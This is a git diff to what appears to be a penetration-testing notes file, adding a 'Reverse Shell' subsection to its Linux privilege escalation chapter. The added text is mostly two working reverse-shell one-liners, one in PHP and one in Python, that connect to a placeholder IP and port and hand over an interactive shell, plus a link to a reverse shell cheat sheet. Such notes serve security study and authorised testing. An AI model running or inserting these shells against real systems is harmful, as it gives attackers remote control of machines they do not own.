@@ -149,6 +149,7 @@ I try as much as possible to link to the various sources or inspiration for thes
   - [Linux Privilege Escalation](#linux-privilege-escalation)
     - [Resources](#resources-2)
     - [Strategy](#strategy)
+    - [Reverse Shell](#reverse-shell)
     - [Service Exploits](#service-exploits)
     - [Weak File Permissions](#weak-file-permissions)
     - [Exposed Confidential Information](#exposed-confidential-information)
@@ -3902,6 +3903,22 @@ The first time plink connects to a host, it will attempt to cache the host key i
    - starting from lvl `0` to `2`, `./lse.sh -l 0`
 4. Run other scripts
 5. If the scripts fail, run the commands in this section and see [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+
+#### <ins>Reverse Shell</ins>
+
+**PHP**
+```php
+php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+**Python**
+
+```python
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
+
+**More shells**
+- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 #### <ins>Service Exploits</ins>
 
